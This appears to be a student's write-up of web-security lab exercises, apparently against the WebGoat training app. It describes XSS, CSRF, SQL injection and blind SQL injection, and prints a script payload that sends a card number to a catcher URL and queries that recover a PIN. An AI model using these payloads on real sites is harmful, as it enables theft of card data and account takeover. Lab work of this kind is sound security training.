## Part 1:
In this part I created a simple HTML form that accepts the user's username and password. We are assuming here that the 
user trusts this form and enters the credentials. This works because with the information from user and cross-site 
scripting we will be able to bypass the need for a cookie to log in, and so we basically have the credentials to 
infiltrate the user's account.

## Part 2:
In this part I realized that the pin field of the form is vulnerable to script inputs. So I injected some JavaScript in 
the pin parameter such that it will take the card number object from the DOM and sends its value to the malicious 
endpoint. The non-encoded URL is as follows:
```$xslt
<SCRIPT>
	document.form.input2.value=111;
	document.form.buy.onclick=function(){
		XSSImage=new Image;
		XSSImage.src='http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=document.form.input1.value';
	}
	document.getElementById('message').innerHTML='';
</SCRIPT>
```

## Part 3:
This part simply creates an image content using the message field, which does not filter out HTML tags. So I added a 
malicious `img` tag, and made the source the malicious endpoint which transfers money from the user to the attacker.

## Part 4:
This part implements something similar to the previous part, with the difference that this time we have to confirm 
the money transfer. So now we have 2 steps. That is why I am using the `onload` attribute of the iframe tag, so that 
the completion of the transfer request invokes the confirmation of the transfer.

## Part 5:
This part implements a similar process to part 4, with the twist of adding a random token that the attacker has to 
fetch before the last step of the transfer. This token is actually hidden in the html of the request page. Extracting 
it from the DOM then allowed me to send this over to the malicious endpoint to complete the transfer.

## Part 6:
This part was a very simple SQL injection. I added a statement that is always true in the `SELECT` query so that the 
information for all of the users gets displayed.

## Part 7:
In this part, the webpage is also vulnerable to SQL injections. So after changing one user's salary to a higher value 
through a simple `UPDATE` query, I added a trigger for any new users made to have their emails updated to the ECE568.

## Part 8:
When 2 true things are in an `AND` statement, the outcome is true, and if only one is wrong, the outcome is false. So I
used the verify message as the outcome of an `AND` statement to find the numeric boundaries of the pin. I used the 
following query to find the 2 limits of 4861 and 4863. Then I concluded that the pin is 4862.
```SQL
101 AND (SELECT pin FROM credit WHERE cc_number='1234123412341234') > 4861;
101 AND (SELECT pin FROM credit WHERE cc_number='1234123412341234') > 4863;
```